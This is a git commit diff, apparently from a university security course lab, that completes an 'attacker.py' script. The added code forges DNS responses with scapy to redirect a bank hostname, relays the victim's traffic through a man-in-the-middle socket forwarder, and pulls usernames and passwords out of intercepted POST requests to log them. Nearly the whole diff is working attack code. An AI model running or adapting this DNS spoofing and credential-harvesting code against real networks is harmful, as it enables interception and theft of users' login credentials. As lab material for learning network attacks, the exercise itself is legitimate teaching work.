48cc2dec4af0f4056817d1cb06fa1f38e851d5ea
cs_236350 <ubuntu@ubuntu2004.linuxvmimages.local>
2021-12-26 18:32:06 -0500

    doneee

--- attacker/attacker.py
+++ attacker/attacker.py
@@ -25,7 +25,11 @@ def check_credentials(client_data):
 	# TODO: Take a block of client data and search for username/password credentials.
 	# If found, log the credentials to the system by calling log_credentials().
 	#raise NotImplementedError
-	pass
+	strd = str(client_data)
+	client_data_list = strd.split("'")
+	username = client_data_list[1]
+	password = client_data_list[3]
+	log_credentials(username, password)
 
 
 def handle_tcp_forwarding(client_socket, client_ip, hostname):
@@ -33,35 +37,56 @@ def handle_tcp_forwarding(client_socket, client_ip, hostname):
 	# and initiate a connection with the host in order to forward data
 
 	while True:
-
 		# TODO: accept a new connection from the client on client_socket and
 		# create a new socket to connect to the actual host associated with hostname.
 		# TODO: read data from client socket, check for credentials, and forward along to host socket.
 		# Check for POST to '/post_logout' and exit after that request has completed.
-
-		#raise NotImplementedError
-		pass
+	
+		print("here1")
+		#client_socket.listen(5)
+		print("here2")
+		conn, address = client_socket.accept()
+		print("Conn: " + str(conn))
+		print("Address: " + str(address))
+		bank_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		bank_socket.bind((client_socket.getsockname()[0],0))
+		bank_socket.connect((resolve_hostname(HOSTNAME), WEB_PORT))
+		
+		data = conn.recv(8*1024)
+		data_string = str(data)
+		print("Data: " + str(data))
+		
+		if "POST" in data_string and "username" in data_string and "password" in data_string:
+			print("found credentials")
+			check_credentials(data)
+		if "POST" in data_string and "/post_logout" in data_string:
+			exit(0)
+		bank_socket.send(data)
+		data_from_bank = bank_socket.recv(8*1024)
+		conn.send(data_from_bank)
+		
+		
+		
 
 
 def dns_callback(packet, extra_args):
 	# TODO: Write callback function for handling DNS packets.
 	# Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof.
-	if DNS in packet:
-		print("DNS packet: " + packet.summary())
-		print("Source IP: " + packet[IP].src)
-		print("Dest IP: " + packet[IP].dst)
-		print("Source Port: " + str(packet[UDP].sport))
-		print("Dest Port: " + str(packet[UDP].dport))
-		print("Requested website: " + str(packet.qd.qname))
-		print()
-		dnsrr = DNSRR(rdata=extra_args[0], rrname=HOSTNAME)
-		response_dns = DNS(id=packet[DNS].id, an=dnsrr, qr=0, aa=1)
-		response = IP(src=extra_args[0], dst=packet[IP].src)/UDP(sport=53, dport=packet[UDP].sport)/DNS()
+	if DNS in packet and packet[DNS].qr == 0:
+		#print("DNS packet: " + packet.summary())
+		#print("Source IP: " + packet[IP].src)
+		#print("Dest IP: " + packet[IP].dst)
+		#print("Source Port: " + str(packet[UDP].sport))
+		#print("Dest Port: " + str(packet[UDP].dport))
+		#print("QR flag: " + str(packet[DNS].qr))
+		#print("Requested website: " + str(packet.qd.qname))
+		#print()
+		dnsrr = DNSRR(rdata=extra_args[0], rrname=HOSTNAME, ttl=5)
+		response_dns = DNS(id=packet[DNS].id, qd=packet[DNS].qd, an=dnsrr, qr=1, aa=1)
+		response = IP(src=packet[IP].dst, dst=packet[IP].src, ttl=5)/UDP(sport=53, dport=packet[UDP].sport)/DNS()
 		response[DNS] = response_dns
 		send(response)
-
-
-		send(response)
+		handle_tcp_forwarding(extra_args[1], packet[IP].src, HOSTNAME)
 
 
 
